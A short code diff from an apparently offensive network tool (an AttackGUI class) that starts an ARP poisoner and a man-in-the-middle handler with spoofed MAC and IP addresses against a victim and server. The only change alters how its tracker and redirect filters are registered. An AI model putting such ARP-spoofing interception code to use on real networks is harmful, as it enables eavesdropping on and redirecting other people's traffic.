@@ -288,8 +288,8 @@ class AttackGUI:
                 arp_poisoner = ARPPoisoner(sc.conf.iface, victim_ip, server_ip, spoof_mac, self.log)
 
                 mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim_ip, spoof_mac, spoof_ip, spoof_ipv6, self.log)
-                mitm_handler.add_filter(tracker)
-                mitm_handler.add_filter(redirect)
+                mitm_handler.add_filter(tracker.__call__)
+                mitm_handler.add_filter(redirect.__call__)
                 mitm_handler.start()
                 arp_poisoner.start()
 
